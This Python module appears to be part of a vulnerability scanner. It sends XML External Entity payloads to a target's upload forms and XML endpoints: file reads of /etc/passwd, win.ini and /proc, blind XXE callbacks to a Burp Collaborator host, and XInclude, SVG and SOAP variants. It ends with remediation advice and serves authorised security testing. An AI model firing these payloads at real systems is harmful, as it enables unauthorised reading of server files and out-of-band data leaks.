"""XXE (XML External Entity) Testing Module

Tests for XML External Entity vulnerabilities including classic XXE,
blind XXE, error-based XXE, and parameter entity attacks.
"""

import requests
import sys
import os
import random
import string
from urllib.parse import urlencode
import base64

# Add parent directory to path for imports
sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from utils.color_compat import colored
from utils.ascii_art import AsciiArt


class XXETesting:
    """XXE vulnerability testing suite"""

    def __init__(self, target):
        self.target = target if target.startswith('http') else f'http://{target}'
        self.session = requests.Session()
        self.session.headers.update({'User-Agent': 'CyberGuardian/2.0'})

        # Generate unique callback identifier
        self.callback_id = ''.join(random.choices(string.ascii_lowercase + string.digits, k=8))
        self.callback_url = f"https://{self.callback_id}.burpcollaborator.net"

        # XXE payloads
        self.classic_xxe_payloads = [
            # Basic file read
            """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>&xxe;</root>""",

            # Windows file read
            """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">
]>
<root>&xxe;</root>""",

            # Alternative file paths
            """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/hosts">
]>
<root>&xxe;</root>""",

            # /proc filesystem
            """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///proc/version">
]>
<root>&xxe;</root>""",
        ]

        self.blind_xxe_payloads = [
            # Blind XXE with external DTD
            """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "https://{callback_id}">
  %xxe;
]>
<root>test</root>""".format(callback_id=self.callback_url),

            # Blind XXE with parameter entities
            """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY % remote SYSTEM "https://{callback_id}/xxe.dtd">
  %remote;
  %send;
]>""".format(callback_id=self.callback_url),

            # DNS callback
            """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "http://{callback_id}.burpcollaborator.net">
  %xxe;
]>
<root>test</root>""".format(callback_id=self.callback_id),
        ]

        self.error_based_xxe_payloads = [
            # Error-based XXE
            """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///nonexistent/file">
]>
<root>&xxe;</root>""",

            # Parameter entity error
            """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "file:///etc/passwd">
  %xxe;
]>
<root>test</root>""",
        ]

        self.advanced_xxe_payloads = [
            # XXE with XInclude
            """<root xmlns:xi="http://www.w3.org/2001/XInclude">
<xi:include href="file:///etc/passwd" parse="text"/>
</root>""",

            # SVG XXE
            """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<svg>&xxe;</svg>""",

            # SOAP XXE
            """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE soap [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<soap>&xxe;</soap>""",
        ]

    def test_xxe(self):
        """Main XXE testing function"""
        print(colored("\n╔═══════════════════ XXE VULNERABILITY TESTING ═════════════════════╗", 'red', attrs=['bold']))
        print(f"\n{colored('Target:', 'yellow')} {self.target}\n")

        try:
            results = {
                'classic_xxe': self._test_classic_xxe(),
                'blind_xxe': self._test_blind_xxe(),
                'error_based_xxe': self._test_error_based_xxe(),
                'advanced_xxe': self._test_advanced_xxe()
            }

            self._print_summary(results)
            return results

        except Exception as e:
            AsciiArt.error_message(f"XXE test failed: {str(e)}")
            return {}

    def _test_classic_xxe(self):
        """Test for classic XXE vulnerabilities"""
        print(f"{colored('Testing classic XXE...', 'yellow')}")

        results = {
            'vulnerable': False,
            'payloads': [],
            'responses': []
        }

        # Find XML submission points
        xml_vectors = self._find_xml_vectors()

        if not xml_vectors:
            print(f"  {colored('ℹ No XML submission points found', 'blue')}")
            return results

        for vector in xml_vectors:
            print(f"  {colored('Testing vector:', 'white')} {vector['name']}")

            for payload in self.classic_xxe_payloads:
                try:
                    result = self._test_xxe_payload(vector, payload)
                    if result['vulnerable']:
                        results['vulnerable'] = True
                        results['payloads'].append(payload)
                        results['responses'].append(result['response'][:200])
                        print(f"    {colored('✗ Classic XXE Found:', 'red', attrs=['bold'])}")
                        print(f"      Vector: {colored(vector['name'], 'yellow')}")
                        print(f"      Response: {colored(result['response'][:100] + '...', 'white')}")
                        return results
                except:
                    continue

        print(f"  {colored('✓ Classic XXE not detected', 'green')}")
        return results

    def _test_blind_xxe(self):
        """Test for blind XXE vulnerabilities"""
        print(f"\n{colored('Testing blind XXE...', 'yellow')}")

        results = {
            'vulnerable': False,
            'payloads': [],
            'callback_id': self.callback_id
        }

        print(f"  {colored('ℹ Blind XXE requires callback server', 'blue')}")
        print(f"  {colored('ℹ Callback ID:', 'blue')} {self.callback_id}")

        xml_vectors = self._find_xml_vectors()
        if not xml_vectors:
            return results

        for vector in xml_vectors:
            print(f"  {colored('Testing vector:', 'white')} {vector['name']}")

            for payload in self.blind_xxe_payloads:
                try:
                    result = self._test_xxe_payload(vector, payload)
                    if result and result.get('status_code') == 200:
                        results['vulnerable'] = True
                        results['payloads'].append(payload)
                        print(f"    {colored('⚠ Potential Blind XXE:', 'yellow', attrs=['bold'])}")
                        print(f"      Vector: {colored(vector['name'], 'yellow')}")
                        print(f"      Note: Check callback server for confirmation")
                        return results
                except:
                    continue

        print(f"  {colored('✓ Blind XXE not detected', 'green')}")
        return results

    def _test_error_based_xxe(self):
        """Test for error-based XXE"""
        print(f"\n{colored('Testing error-based XXE...', 'yellow')}")

        results = {
            'vulnerable': False,
            'payloads': [],
            'error_messages': []
        }

        xml_vectors = self._find_xml_vectors()
        if not xml_vectors:
            return results

        for vector in xml_vectors:
            print(f"  {colored('Testing vector:', 'white')} {vector['name']}")

            for payload in self.error_based_xxe_payloads:
                try:
                    result = self._test_xxe_payload(vector, payload)
                    if result['status_code'] >= 400:
                        # Look for XXE-related error messages
                        error_indicators = [
                            'xml', 'dtd', 'entity', 'external',
                            'file://', 'etc/passwd', 'win.ini',
                            'parse error', 'xml parsing'
                        ]

                        response_lower = result['response'].lower()
                        if any(indicator in response_lower for indicator in error_indicators):
                            results['vulnerable'] = True
                            results['payloads'].append(payload)
                            results['error_messages'].append(result['response'][:200])
                            print(f"    {colored('✗ Error-based XXE Found:', 'red', attrs=['bold'])}")
                            print(f"      Error: {colored(result['response'][:100] + '...', 'white')}")
                            return results

                except:
                    continue

        print(f"  {colored('✓ Error-based XXE not detected', 'green')}")
        return results

    def _test_advanced_xxe(self):
        """Test for advanced XXE techniques"""
        print(f"\n{colored('Testing advanced XXE...', 'yellow')}")

        results = {
            'vulnerable': False,
            'payloads': [],
            'techniques': []
        }

        xml_vectors = self._find_xml_vectors()
        if not xml_vectors:
            return results

        for vector in xml_vectors:
            print(f"  {colored('Testing vector:', 'white')} {vector['name']}")

            for payload in self.advanced_xxe_payloads:
                try:
                    result = self._test_xxe_payload(vector, payload)
                    if result['vulnerable']:
                        technique = self._identify_xxe_technique(payload)
                        results['vulnerable'] = True
                        results['payloads'].append(payload)
                        results['techniques'].append(technique)
                        print(f"    {colored('✗ Advanced XXE Found:', 'red', attrs=['bold'])}")
                        print(f"      Technique: {colored(technique, 'yellow')}")
                        return results
                except:
                    continue

        print(f"  {colored('✓ Advanced XXE not detected', 'green')}")
        return results

    def _find_xml_vectors(self):
        """Find potential XML submission vectors"""
        vectors = []

        # Look for forms that might accept XML
        try:
            from bs4 import BeautifulSoup
            response = self.session.get(self.target, timeout=10, verify=False)
            soup = BeautifulSoup(response.text, 'html.parser')

            # Find file upload forms
            for form in soup.find_all('form'):
                file_inputs = form.find_all('input', {'type': 'file'})
                if file_inputs:
                    vectors.append({
                        'type': 'file_upload',
                        'name': f"File Upload Form: {form.get('action', 'unknown')}",
                        'action': form.get('action', ''),
                        'method': form.get('method', 'post'),
                        'file_input': file_inputs[0].get('name', 'file')
                    })

        except:
            pass

        # Add common XML endpoints
        xml_endpoints = [
            {'type': 'api', 'name': 'API Endpoint: /api/xml', 'url': f"{self.target.rstrip('/')}/api/xml"},
            {'type': 'api', 'name': 'API Endpoint: /upload', 'url': f"{self.target.rstrip('/')}/upload"},
            {'type': 'api', 'name': 'API Endpoint: /import', 'url': f"{self.target.rstrip('/')}/import"},
        ]

        vectors.extend(xml_endpoints)

        return vectors

    def _test_xxe_payload(self, vector, payload):
        """Test XXE payload against a vector"""
        try:
            if vector['type'] == 'file_upload':
                return self._test_file_upload_xxe(vector, payload)
            elif vector['type'] == 'api':
                return self._test_api_xxe(vector, payload)
        except Exception as e:
            return {'vulnerable': False, 'error': str(e)}

    def _test_file_upload_xxe(self, form_info, payload):
        """Test XXE via file upload"""
        try:
            action = form_info['action']
            if not action.startswith('http'):
                from urllib.parse import urljoin
                action = urljoin(self.target, action)

            # Create XML file with XXE payload
            files = {form_info['file_input']: ('test.xml', payload, 'application/xml')}

            response = self.session.post(action, files=files, timeout=15, verify=False)

            return self._analyze_xxe_response(response, payload)
        except:
            return {'vulnerable': False}

    def _test_api_xxe(self, api_info, payload):
        """Test XXE via API endpoint"""
        try:
            headers = {'Content-Type': 'application/xml'}

            response = self.session.post(api_info['url'], data=payload, headers=headers, timeout=15, verify=False)

            return self._analyze_xxe_response(response, payload)
        except:
            return {'vulnerable': False}

    def _analyze_xxe_response(self, response, payload):
        """Analyze HTTP response for XXE evidence"""
        if not response:
            return {'vulnerable': False, 'response': ''}

        response_text = response.text

        # Check for file content indicators
        file_indicators = [
            'root:x:0:0',          # /etc/passwd
            'daemon:x:1:1',        # /etc/passwd
            '127.0.0.1',           # /etc/hosts
            'localhost',           # /etc/hosts
            '[boot loader]',       # Windows boot.ini
            'for 16-bit app support', # Windows win.ini
            'fonts', 'extensions', 'files', # Windows win.ini
        ]

        for indicator in file_indicators:
            if indicator.lower() in response_text.lower():
                return {
                    'vulnerable': True,
                    'response': response_text[:500],
                    'indicator': f"File content: {indicator}",
                    'status_code': response.status_code
                }

        # Check for XML parser errors
        xml_error_indicators = [
            'xml parsing error',
            'xmlerror',
            'dtd',
            'entity',
            'external entity',
            'xml declaration',
            'well-formed',
            'syntax error'
        ]

        for indicator in xml_error_indicators:
            if indicator in response_text.lower():
                return {
                    'vulnerable': False,  # XML processed but error occurred
                    'response': response_text[:500],
                    'error': f"XML Parser Error: {indicator}",
                    'status_code': response.status_code
                }

        return {
            'vulnerable': False,
            'response': response_text[:200],
            'status_code': response.status_code
        }

    def _identify_xxe_technique(self, payload):
        """Identify the XXE technique used in payload"""
        if 'XInclude' in payload:
            return 'XInclude Injection'
        elif 'svg' in payload.lower():
            return 'SVG XXE'
        elif 'soap' in payload.lower():
            return 'SOAP XXE'
        elif 'parameter' in payload.lower():
            return 'Parameter Entity XXE'
        elif 'file://' in payload:
            return 'Classic File XXE'
        else:
            return 'Unknown XXE Technique'

    def _print_summary(self, results):
        """Print comprehensive XXE testing summary"""
        print(colored("╚═════════════════════════════════════════════════════════════════╝\n", 'red', attrs=['bold']))

        vulnerable_count = sum(1 for r in results.values() if isinstance(r, dict) and r.get('vulnerable'))
        total_tests = sum(1 for r in results.values() if isinstance(r, dict))

        print(f"{colored('XXE TESTING SUMMARY:', 'yellow', attrs=['bold'])}")
        print(f"  • Tests performed: {colored(str(total_tests), 'green')}")
        print(f"  • Vulnerabilities found: {colored(str(vulnerable_count), 'red' if vulnerable_count > 0 else 'green')}")

        if vulnerable_count > 0:
            print(f"\n{colored('⚠ XXE VULNERABILITIES DETECTED:', 'red', attrs=['bold'])}")

            for test_type, result in results.items():
                if isinstance(result, dict) and result.get('vulnerable'):
                    print(f"  • {colored(test_type.replace('_', ' ').title(), 'red')}:")
                    if result.get('responses'):
                        for response in result.get('responses', [])[:1]:
                            print(f"    Response: {colored(response[:100] + '...', 'white')}")
                    if result.get('techniques'):
                        for technique in result.get('techniques', []):
                            print(f"    Technique: {colored(technique, 'yellow')}")

            print(f"\n{colored('🚨 CRITICAL RISK DETECTED:', 'red', attrs=['bold'])}")
            print(f"  • XXE can lead to:")
            print(f"    - Local file read")
            print(f"    - Internal network scanning")
            print(f"    - Server-side request forgery")
            print(f"    - Denial of service")
            print(f"    - Remote code execution (in some cases)")

            print(f"\n{colored('📋 IMMEDIATE REMEDIATION:', 'yellow', attrs=['bold'])}")
            print(f"  1. Disable XML external entities in parser configuration")
            print(f"  2. Use less complex data formats (JSON instead of XML)")
            print(f"  3. Validate and sanitize all XML input")
            print(f"  4. Update XML parser to latest secure version")
            print(f"  5. Implement input validation and whitelist allowed XML")
            print(f"  6. Use web application firewall (WAF)")
            print(f"  7. Regular security testing and code reviews\n")
        else:
            print(f"\n{colored('✓ No XXE vulnerabilities detected', 'green')}\n")